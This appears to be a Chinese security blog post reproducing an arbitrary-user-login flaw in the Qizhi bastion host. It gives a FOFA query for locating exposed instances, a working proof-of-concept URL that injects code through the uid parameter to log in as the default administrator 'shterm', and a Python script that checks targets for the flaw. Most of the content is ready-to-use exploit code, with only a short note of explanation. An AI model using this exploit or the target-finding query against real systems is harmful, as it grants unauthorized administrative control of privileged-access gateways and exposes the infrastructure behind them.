---
title: 齐治堡垒机任意用户登录
tags:
  - vuln
categories:
  - 漏洞复现
copyright: true
abbrlink: f8593b1e
index_img: https://z3.ax1x.com/2021/07/13/WFHmrV.jpg
banner_img: https://z3.ax1x.com/2021/07/13/WFHmrV.jpg
date: 2021-07-12 21:33:54
---


### 齐治堡垒机存在任意用户登录漏洞

   齐治堡垒机存在任意用户登录漏洞，访问特定的URL即可获得后台权限

### 验证

fofa  `app="齐治科技-堡垒机"`

POC

```sqlite
http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
```

`shterm` 为缺省管理员账户。

审计员：

![](https://z3.ax1x.com/2021/07/13/WF7zKP.png)



切换超管角色：

![](https://z3.ax1x.com/2021/07/13/WFHpb8.png)

PY脚本

```python
import requests,sys,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# for url in  open("C:/1.txt","r"):
if len(sys.argv)<2:
        print("[+]Use: pyhton3 齐治科技-堡垒机.py http://ip:port")
        print("[+]Explain: HADESI")
        print("[+]============================")
        sys.exit()

url=sys.argv[1]
url1=url+"/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"

res = requests.get(url=url1,verify=False)
# print (res.status_code)
if res.status_code == 200 :
    print(url1+">>>>>漏洞存在")
```

Reference

https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web应用漏洞/齐治堡垒机/齐治堡垒机%20任意用户登录漏洞.md